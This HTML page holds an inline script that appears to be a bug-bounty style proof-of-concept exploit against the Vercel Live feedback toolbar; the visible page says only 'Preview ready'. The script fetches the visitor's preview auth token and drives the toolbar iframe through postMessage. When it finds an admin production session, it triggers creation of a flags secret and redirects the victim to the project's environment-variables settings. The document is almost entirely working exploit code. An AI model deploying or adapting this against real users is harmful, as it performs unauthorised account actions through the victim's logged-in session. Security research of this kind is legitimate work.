<!doctype html>
<script>
(() => {
  const LIVE_ORIGIN = 'https://vercel.live';
  const PROJECT_ID = 'prj_eg3xiAzg9rqF1tLFbXOkCwpftLJO';
  const OWNER_ID = 'team_qmp53qfzAPgwkguhRzHvSwgV';
  const OWNER_SLUG = 'testteam22-687d';
  const PROJECT_SLUG = 'naturell-toolbar-fork-victim-20260809';
  const PRODUCTION_BRANCH = 'main';
  const PRODUCTION_ROOM_SHA256 =
    'f637935f61809b35a7dc4b92f6067a8081399f4808dbda429bb00f60ef53130a';
  const SOURCE_MARKER =
    'naturell_external_fork_flags_secret_creation_20260810';
  const requestedMarker = new URLSearchParams(location.search).get('marker');
  const PROOF_MARKER =
    /^naturell_external_fork_flags_secret_[0-9a-f]{24}$/.test(
      requestedMarker || ''
    ) ? requestedMarker : null;
  const PROJECT_STAGE =
    new URLSearchParams(location.search).get('stage') === 'project';
  const PREVIEW_AUTH_KEY =
    'naturell-external-fork-flags-preview-authenticated';
  const MUTATION_LATCH_KEY =
    `naturell-external-fork-flags-mutation-${PROOF_MARKER || 'invalid'}`;

  let vercelAuthJWE = null;

  const state = window.__naturellFlagsSecretCreation = {
    sourceMarker: SOURCE_MARKER,
    proofMarker: PROOF_MARKER,
    phase: 'bootstrap',
    authStage: PROJECT_STAGE ? 'project' : 'preview',
    previewAuthAccepted:
      sessionStorage.getItem(PREVIEW_AUTH_KEY) === '1',
    toolbarReady: false,
    initAccepted: false,
    projectMatched: false,
    productionSession: false,
    roomMatched: false,
    scopeMatched: false,
    hasFlagsSecretWasFalse: false,
    isAdminWasTrue: false,
    isLocalhostWasTrue: false,
    teamMatched: false,
    mutationLatchSet: false,
    mutationSent: false,
    replyReceived: false,
    replyAccepted: false,
    resultTruthy: false,
    resultType: null,
    resultKeys: [],
    resultStringLength: null,
    resultStringSha256: null,
    dashboardNavigationSent: false,
    target: null,
    targets: [],
    replyId: null,
  };

  function randomHex(byteCount) {
    const bytes = new Uint8Array(byteCount);
    crypto.getRandomValues(bytes);
    return Array.from(bytes, byte =>
      byte.toString(16).padStart(2, '0')
    ).join('');
  }

  async function sha256Text(value) {
    const bytes = new TextEncoder().encode(value);
    const digest = await crypto.subtle.digest('SHA-256', bytes);
    return Array.from(new Uint8Array(digest), byte =>
      byte.toString(16).padStart(2, '0')
    ).join('');
  }

  function safeState() {
    return {
      sourceMarker: state.sourceMarker,
      proofMarker: state.proofMarker,
      phase: state.phase,
      authStage: state.authStage,
      previewAuthAccepted: state.previewAuthAccepted,
      toolbarReady: state.toolbarReady,
      initAccepted: state.initAccepted,
      projectMatched: state.projectMatched,
      productionSession: state.productionSession,
      roomMatched: state.roomMatched,
      scopeMatched: state.scopeMatched,
      hasFlagsSecretWasFalse: state.hasFlagsSecretWasFalse,
      isAdminWasTrue: state.isAdminWasTrue,
      isLocalhostWasTrue: state.isLocalhostWasTrue,
      teamMatched: state.teamMatched,
      mutationLatchSet: state.mutationLatchSet,
      mutationSent: state.mutationSent,
      replyReceived: state.replyReceived,
      replyAccepted: state.replyAccepted,
      resultTruthy: state.resultTruthy,
      resultType: state.resultType,
      resultKeys: state.resultKeys,
      resultStringLength: state.resultStringLength,
      resultStringSha256: state.resultStringSha256,
      dashboardNavigationSent: state.dashboardNavigationSent,
    };
  }

  function setPhase(phase) {
    state.phase = phase;
    document.documentElement.dataset.flagsSecretPhase = phase;
    window.name = `naturell-flags-secret:${JSON.stringify(safeState())}`;
  }

  function loadToolbar() {
    const script = document.createElement('script');
    script.async = true;
    script.dataset.explicitOptIn = 'true';
    script.src = 'https://vercel.live/_next-live/feedback/feedback.js';
    document.head.append(script);
  }

  async function prepareToolbar() {
    if (!PROOF_MARKER) {
      setPhase('proof-marker-invalid');
      return;
    }
    if (PROJECT_STAGE && !state.previewAuthAccepted) {
      setPhase('project-stage-without-preview-auth');
      return;
    }
    if (!PROJECT_STAGE) {
      setPhase('preview-jwe-fetching');
      try {
        const response = await fetch('/.well-known/vercel/jwe', {
          credentials: 'include',
          cache: 'no-store',
        });
        if (response.status === 200) vercelAuthJWE = await response.text();
      } catch {}
      if (!vercelAuthJWE) {
        setPhase('preview-jwe-unavailable');
        return;
      }
    }
    setPhase('waiting-for-toolbar-ready');
    loadToolbar();
  }

  async function summarizeResult(result) {
    state.resultTruthy = Boolean(result);
    if (result === null) {
      state.resultType = 'null';
      return;
    }
    if (Array.isArray(result)) {
      state.resultType = 'array';
      return;
    }
    state.resultType = typeof result;
    if (typeof result === 'object') {
      state.resultKeys = Object.keys(result).sort();
    }
    if (typeof result === 'string') {
      state.resultStringLength = result.length;
      state.resultStringSha256 = await sha256Text(result);
    }
  }

  function navigateToDashboard() {
    state.dashboardNavigationSent = true;
    setPhase('dashboard-navigation-sent');
    const destination = new URL(
      `https://vercel.com/${OWNER_SLUG}/${PROJECT_SLUG}/settings/environment-variables`
    );
    destination.searchParams.set('deliverySource', SOURCE_MARKER);
    destination.searchParams.set('proofMarker', PROOF_MARKER);
    location.replace(destination.href);
  }

  addEventListener('message', async event => {
    if (event.origin !== LIVE_ORIGIN || !event.data) return;

    try {
      if (event.data.type === 'ready' && event.source) {
        if (state.targets.includes(event.source)) return;
        state.targets.push(event.source);
        state.toolbarReady = true;
        setPhase('toolbar-init-sent');
        event.source.postMessage({
          type: 'preview-origin',
          previewOrigin: window.origin,
          path: window.location.pathname + window.location.search,
        }, LIVE_ORIGIN);
        const authOptions = PROJECT_STAGE ? {
          projectId: PROJECT_ID,
          ownerId: OWNER_ID,
          branch: PRODUCTION_BRANCH,
        } : {
          hostname: location.hostname,
          deploymentId: '',
          path: '/',
          vercelAuthJWE,
        };
        event.source.postMessage({
          type: 'init',
          authOptions,
          origin: LIVE_ORIGIN,
          page: '/',
        }, LIVE_ORIGIN);
        return;
      }

      if (
        event.data.type === 'init-reply' &&
        state.targets.includes(event.source) &&
        !state.initAccepted
      ) {
        const session = event.data.existingAuth?.session;
        state.projectMatched = session?.projectId === PROJECT_ID;
        if (!session || !state.projectMatched || !session.roomId) return;

        if (!PROJECT_STAGE) {
          if (session.deploymentTarget !== 'preview') return;
          state.initAccepted = true;
          state.previewAuthAccepted = true;
          sessionStorage.setItem(PREVIEW_AUTH_KEY, '1');
          setPhase('preview-authenticated-reload');
          const next = new URL(location.href);
          next.searchParams.set('stage', 'project');
          next.searchParams.set('delivery', 'flags-secret');
          location.replace(next.href);
          return;
        }

        state.productionSession = session.deploymentTarget === 'production';
        state.scopeMatched =
          session.ownerSlug === OWNER_SLUG &&
          session.roomKey === PRODUCTION_BRANCH;
        state.teamMatched =
          session.ownerId === OWNER_ID || session.teamId === OWNER_ID;
        state.roomMatched =
          await sha256Text(session.roomId) === PRODUCTION_ROOM_SHA256;
        state.hasFlagsSecretWasFalse = session.hasFlagsSecret === false;
        state.isAdminWasTrue = session.isAdmin === true;
        state.isLocalhostWasTrue = session.isLocalhost === true;
        if (
          !state.productionSession ||
          !state.scopeMatched ||
          !state.teamMatched ||
          !state.roomMatched ||
          !state.hasFlagsSecretWasFalse ||
          !state.isAdminWasTrue ||
          !state.isLocalhostWasTrue ||
          sessionStorage.getItem(MUTATION_LATCH_KEY) === '1'
        ) return;

        state.target = event.source;
        state.initAccepted = true;
        state.replyId = `naturell-flags-secret-${randomHex(8)}`;
        sessionStorage.setItem(MUTATION_LATCH_KEY, '1');
        state.mutationLatchSet = true;
        state.mutationSent = true;
        setPhase('flags-secret-creation-sent');
        state.target.postMessage({
          type: 'generate-flags-secret',
          replyId: state.replyId,
        }, LIVE_ORIGIN);
        return;
      }

      if (
        event.data.type !== 'live-frame-reply' ||
        event.source !== state.target ||
        event.data.id !== state.replyId
      ) return;

      state.replyReceived = true;
      if (event.data.error) {
        setPhase('flags-secret-creation-rejected');
        return;
      }
      await summarizeResult(event.data.result);
      state.replyAccepted = state.resultTruthy;
      if (!state.replyAccepted) {
        setPhase('flags-secret-creation-not-confirmed');
        return;
      }
      setPhase('flags-secret-creation-reply-accepted');
      navigateToDashboard();
    } catch {
      setPhase('flags-secret-script-error');
    }
  });

  setTimeout(() => {
    if (!state.dashboardNavigationSent) setPhase('flags-secret-timeout');
  }, 60000);
  prepareToolbar();
})();
</script>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Naturell External Preview</title>

  :root { color-scheme: light dark; font-family: system-ui, sans-serif; }
  body { min-height: 100vh; display: grid; place-items: center; margin: 0; }
  main { text-align: center; }
</style>
<main>
  <h1>Preview ready</h1>
  <p>Naturell synthetic external fork fixture</p>
</main>
